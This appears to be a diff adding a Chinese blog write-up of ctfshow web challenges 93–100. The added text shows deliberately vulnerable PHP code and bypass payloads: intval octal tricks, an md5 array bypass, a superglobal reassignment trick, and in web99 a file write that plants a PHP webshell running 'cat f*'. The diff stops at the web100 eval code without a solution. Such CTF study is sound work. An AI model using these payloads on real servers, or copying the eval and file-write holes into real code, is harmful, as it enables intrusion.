@@ -448,7 +448,234 @@ if(isset($_GET[&#39;num&#39;])){
 }</code></pre><p>首先要求num!=4476,然后intval($num,0)==4476</p>
 <p>八进制和十六进制还是可行的</p>
 <pre><code>?num=0x117c    //十六进制
-?num=010574    //八进制</code></pre>
+?num=010574    //八进制</code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:32:58
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if($num==4476){
+        die(&quot;no no no!&quot;);
+    }
+    if(preg_match(&quot;/[a-z]/i&quot;, $num)){
+        die(&quot;no no no!&quot;);
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+}</code></pre><p>有个preg_match(“/[a-z]/i”, $num)，所以不能用16进制了，八进制<code>?num=010574</code></p>
+<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:46:19
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if($num===&quot;4476&quot;){
+        die(&quot;no no no!&quot;);
+    }
+    if(preg_match(&quot;/[a-z]/i&quot;, $num)){
+        die(&quot;no no no!&quot;);
+    }
+    if(!strpos($num, &quot;0&quot;)){
+        die(&quot;no no no!&quot;);
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+}</code></pre><p>多了一个strpos($num, “0”)，关于strpos</p>
+<pre><code>strpos
+(PHP 4, PHP 5, PHP 7)
+strpos — 查找字符串首次出现的位置
+说明
+mixed strpos( string $haystack, mixed $needle[, int $offset = 0] )
+返回 needle 在 haystack 中首次出现的数字位置。</code></pre><p>此时再看我们的八进制payload<code>?num=010574</code>,0首次出现的位置就是第一位，也就是第0位，此时为True，那么我们只需要讲0放在不是第一位就好了，用非数字符号绕过。</p>
+<p>payload<code>?num=%20010574</code>    // 010574</p>
+<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:53:59
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if($num==4476){
+        die(&quot;no no no!&quot;);
+    }
+    if(preg_match(&quot;/[a-z]|\./i&quot;, $num)){
+        die(&quot;no no no!!&quot;);
+    }
+    if(!strpos($num, &quot;0&quot;)){
+        die(&quot;no no no!!!&quot;);
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }
+}</code></pre><p>没什么大的区别</p>
+<p>payload<code>?num=%20010574</code></p>
+<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 19:21:24
+# @link: https://ctfer.com
+
+*/
+
+
+highlight_file(__FILE__);
+
+if(isset($_GET[&#39;u&#39;])){
+    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;){
+        die(&quot;no no no&quot;);
+    }else{
+        highlight_file($_GET[&#39;u&#39;]);
+    }
+
+
+}</code></pre><p>这里还是看一下highlight_file</p>
+<pre><code>
+highlight_file
+(PHP 4, PHP 5, PHP 7)
+highlight_file — 语法高亮一个文件
+说明
+mixed highlight_file( string $filename[, bool $return = false] )
+参数
+filename 欲高亮文件的路径。 return 设置该参数为 TRUE 使函数返回高亮后的代码。 </code></pre><p>既然filename是路径，那就加个当前路径，没什么影响。</p>
+<p>payload<code>?u=./flag.php</code></p>
+<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 19:36:32
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {
+if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
+if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
+echo $flag;
+else
+print &#39;Wrong.&#39;;
+}
+?&gt;</code></pre><p>这里要求</p>
+<pre><code>$_POST[&#39;a&#39;] != $_POST[&#39;b&#39;]
+md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code></pre><p>经典数组绕过，让他们能返回null    <code>a[]=1&amp;b[]=2</code></p>
+<p>注意这里两个md5比较用的是===，如果是==的话，可以用那种0e的方法绕</p>
+<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 21:39:27
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;    
+//先判断GET方式是否有值，如果有，则等于POST方式的值，否则等于’flag‘
+$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;
+//如果GET方式的flag等于‘flag’,那么等于$_COOKIE，否则等于‘flag’
+$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;;
+//如果GET方式的’flag‘等于‘flag’，那么等于$_SERVER，否则等于‘flag’
+highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);
+//HTTP_FLAG等于‘flag’，就给flag
+?&gt;</code></pre><p>给我绕晕了，先捋一捋，不管GET方式传递的是什么，最终都会被POST方式的替代，那么GET方式随便传，然后POST方式给HTTP_FLAG赋值flag</p>
+<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 22:36:12
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+$allow = array();
+for ($i=36; $i &lt; 0x36d; $i++) { 
+    array_push($allow, rand(1,$i));
+}
+if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){
+    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
+}
+
+?&gt;</code></pre><p>这里是先给一个$allow数组，往数组里塞随机数字，然后就是$_GET[‘n’]了，先判断n是否存在，然后就是file_put_contents写文件了，因为36一定存在，所以GET方式的文件名我们传36.php，这里通过弱比较36==36.php，POST方式的content写PHP马<code>&lt;?php system(&#39;cat f*&#39;); ?&gt;</code></p>
+<p>然后访问/36.php，然后查看源代码</p>
+<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-21 22:10:28
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include(&quot;ctfshow.php&quot;);
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET[&#39;v1&#39;];
+$v2=$_GET[&#39;v2&#39;];
+$v3=$_GET[&#39;v3&#39;];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match(&quot;/\;/&quot;, $v2)){
+        if(preg_match(&quot;/\;/&quot;, $v3)){
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        }
+    }
+
+}
+
+
+?&gt;</code></pre>
         </div>
         <!-- .entry-content -->
         
